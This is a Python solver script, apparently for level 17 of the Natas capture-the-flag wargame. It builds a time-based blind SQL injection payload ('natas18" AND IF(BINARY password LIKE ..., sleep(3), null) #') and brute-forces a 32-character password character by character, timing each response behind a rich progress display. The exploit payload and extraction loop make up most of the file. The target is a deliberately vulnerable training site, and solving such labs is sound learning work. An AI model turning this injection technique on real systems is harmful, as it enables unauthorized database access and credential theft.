import time
from rich.live import Live
from rich.text import Text
from rich.console import Group, Console
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from .base_solver import NatasSolver
from utils.helpers import get_charset

class Natas17Solver(NatasSolver):
    def solve(self) -> str:
        try:
            password = ""
            chars = get_charset()
            console = Console()
            
            # Create progress display
            progress = Progress(
                SpinnerColumn(),
                TextColumn("[progress.description]{task.description}"),
                BarColumn(),
                TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
                console=console,
                expand=True
            )
            
            # Add single task for password progress
            password_task = progress.add_task("[cyan]Password Progress\n", total=32)
            status_line = Text()
            
            console.print("[*] Starting time-based brute force...\n")
            
            with Live(
                Group(
                    status_line,
                    Text(""),  # Spacing
                    progress
                ),
                console=console,
                refresh_per_second=4,  # Reduced refresh rate
                transient=True  # Changed to True to prevent accumulation
            ) as live:
                while len(password) < 32:
                    for c in chars:
                        # Update progress and status
                        progress.update(password_task, completed=len(password))
                        status_line.plain = f"Current Password: {password}\nTesting: {c}"
                        live.update(Group(status_line, Text(""), progress))
                        
                        # SQL injection with time-based payload
                        payload = {
                            "username": f'natas18" AND IF(BINARY password LIKE "{password}{c}%", sleep(3), null) #'
                        }
                        
                        # Check response time
                        start_time = time.time()
                        response = self.make_request(
                            method="POST",
                            data=payload
                        )
                        end_time = time.time()
                        
                        if end_time - start_time >= 3:
                            password += c
                            break
                
                # Show completion
                progress.update(password_task, completed=32)
                console.print(f"\n[green]✓[/green] Password found: {password}\n")
                return password
            
        except Exception as e:
            raise RuntimeError(f"Failed to solve natas17: {str(e)}")

